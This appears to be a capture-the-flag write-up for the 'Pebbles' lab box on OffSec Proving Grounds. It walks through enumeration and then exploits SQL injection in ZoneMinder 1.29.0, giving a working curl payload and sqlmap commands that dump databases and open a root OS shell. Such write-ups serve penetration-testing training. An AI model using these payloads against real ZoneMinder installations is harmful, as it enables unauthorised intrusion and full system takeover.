# Pebbles

## Introduction

Pebbles is a 'warm up' category linux box on offsec proving grounds.  

## Enumeration

### Nmap

Nmap scan of all tcp ports.  

```
21/tcp   open  ftp     syn-ack ttl 61 vsftpd 3.0.3
22/tcp   open  ssh     syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))
3305/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))
8080/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))
```

### Searchsploit

vsftpd 3.0.3    remote DoS  
OpenSSH 7.2p2   username enumeration  

### HTTP 80

Directory scanning with common.txt  

```
/cgi-bin                                                                                                                                                              
/css                                                                                                                                                                         
/images                                                                                                                                                                      
/index.php                                                                                                                                                            
/javascript                                                                                                                                                                  
/server-status
 ```

Directory scanning with raft large.  

`\zm`

Zoneminder console version.  

`1.29.0`

Searchsploit research finds ZoneMinder 1.29.0 is vulnerable to sql injection.  

## SQL injection (port 80)

The following command is PoC of a sql injection.  

`curl -X POST -d 'view=request&request=log&task=query&limit=100;(SELECT * FROM (SELECT(SLEEP(5)))OQkj)#&minTime=1466674406.084434' http://192.168.241.52/zm/index.php`

Dump database with sqlmap.  

`sqlmap --url http://192.168.241.52/zm/index.php --method POST --data 'view=request&request=log&task=query&limit=100&minTime=1466674406.084434' -p limit --dbs --columns`

Databases.  

```
information_schema
mysql
performance_schema
sys
zm
```

## Root

Sqlmap returns a root user shell.  

`sqlmap --url http://<ip>/zm/index.php --method POST --data 'view=request&request=log&task=query&limit=100&minTime=1466674406.084434' -p limit --os-shell` 
